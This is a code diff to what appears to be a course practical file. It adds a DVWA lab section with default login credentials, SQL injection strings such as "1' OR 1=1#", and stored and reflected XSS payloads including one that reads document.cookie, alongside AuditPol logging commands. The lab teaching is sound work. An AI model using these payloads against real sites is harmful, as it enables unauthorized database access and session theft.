@@ -98,21 +98,64 @@ netstat -help`,
   
   {
     id: "prac-5",
-    title: "Prac 5: System Hacking (dvwa, audit)",
-    description: "Practice system hacking using DVWA and monitoring with Audit Policy (AuditPol).",
+    title: "Prac 5: System Hacking (DVWA & Audit)",
+    description: "System hacking techniques using DVWA for SQLi/XSS and AuditPol for system monitoring.",
     language: "bash",
-    tags: ["system-hacking", "dvwa", "auditpol", "windows-security"],
-    code: `System Hacking Practicals`,
+    tags: ["system-hacking", "dvwa", "auditpol", "sqli", "xss"],
+    code: `System Hacking & Monitoring`,
     sections: [
       {
-        title: "DVWA (Damn Vulnerable Web App)",
-        code: `# Access DVWA through your local web server (XAMPP/WAMP) or a dedicated VM.
-# Use DVWA to practice SQL Injection, Brute Force, and XSS.`,
+        title: "DVWA (Login, SQLi, XSS)",
+        code: ` LOGIN & SETUP 
+URL: https://server.vulnapp.id/dvwa/login.php
+Username: admin
+Password: password
+Security Level: Low (DVWA Security -> Low)
+
+ SQL INJECTION 
+1
+1=a
+1=1
+1*
+1' OR 1=1#
+1' OR 1=True#
+1@' OR True#
+
+ XSS (STORED)
+# Message 1:
+<script>alert("your data is at risk")</script>
+
+# Message 2:
+<script>alert(document.baseURI);</script>
+
+# Message 3:
+</script><svg onload=alert('Danger')>
+
+# Message 4:
+<img src="x" onerror="alert('Danger')">
+
+# Message 5:
+<script>
+  var newwindow = window.open('', '', 'height=800,width=800');
+  newwindow.resizeTo(800, 800);
+</script>
+
+ XSS (REFLECTED)
+# Payload 1:
+<script>alert(document.cookie)</script>
+
+# Payload 2:
+<script>window.location = "https://www.w3schools.com/";</script>
+
+# Payload 3:
+<script>
+  var ip = '192.168.2.49';
+  document.write("IP address: " + ip);
+</script>`,
       },
       {
-        title: "Audit Pol ",
-        code: `
-(Run  CMD as Administrator)
+        title: "Audit Pol",
+        code: `(Run CMD as Administrator)
 1. auditpol /get /category:*
 2. auditpol /set /subcategory:"Logon" /success:enable /failure:enable
 3. auditpol /get /category:*
